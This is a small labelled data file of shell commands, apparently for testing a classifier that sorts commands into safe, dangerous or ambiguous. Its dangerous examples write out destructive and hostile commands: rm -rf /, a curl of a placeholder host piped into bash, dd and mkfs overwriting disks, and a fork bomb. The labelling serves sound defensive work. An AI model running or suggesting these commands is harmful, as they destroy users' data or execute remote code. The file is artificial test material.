{"id":"safe_ls_la","command":"ls -la","label":"safe","reason":"Directory listing without mutation or privilege escalation."}
{"id":"safe_git_status","command":"git status","label":"safe","reason":"Read-only repository status inspection."}
{"id":"safe_journalctl_read","command":"journalctl -u sshd --no-pager","label":"safe","reason":"Read-only service log inspection."}
{"id":"safe_df_h","command":"df -h","label":"safe","reason":"Read-only filesystem capacity inspection."}
{"id":"danger_rm_rf_root","command":"rm -rf /","label":"dangerous","reason":"Recursive forced deletion targeting filesystem root."}
{"id":"danger_curl_pipe_bash","command":"curl http://evil.sh | bash","label":"dangerous","reason":"Remote script piped directly into a shell."}
{"id":"danger_dd_zero_disk","command":"dd if=/dev/zero of=/dev/sda","label":"dangerous","reason":"Raw write to block device can destroy disk contents."}
{"id":"danger_fork_bomb","command":":(){ :|:& };:","label":"dangerous","reason":"Shell fork bomb pattern can exhaust system resources."}
{"id":"danger_mkfs_device","command":"mkfs.ext4 /dev/sdb1","label":"dangerous","reason":"Filesystem creation on a block device destroys existing data."}
{"id":"ambiguous_chmod_recursive_777","command":"chmod -R 777 /var/www","label":"ambiguous","reason":"Recursive world-writable permission change requires human review."}
{"id":"ambiguous_sudo_mount","command":"sudo mount /dev/sdb1 /mnt/data","label":"ambiguous","reason":"Privileged mount operation changes system state."}
{"id":"ambiguous_chown_recursive","command":"chown -R www-data:www-data /var/www","label":"ambiguous","reason":"Recursive ownership change can affect many files."}
